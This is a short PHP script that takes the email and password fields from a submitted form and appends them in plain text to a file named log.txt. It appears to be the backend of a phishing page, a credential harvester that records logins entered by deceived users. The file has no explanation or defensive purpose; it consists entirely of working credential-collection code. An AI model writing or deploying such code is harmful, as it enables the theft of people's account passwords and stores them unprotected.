<?php
file_put_contents("log.txt", "Email: ".$_POST['email']." Pass: ".$_POST['pass']."\n", FILE_APPEND);
?>
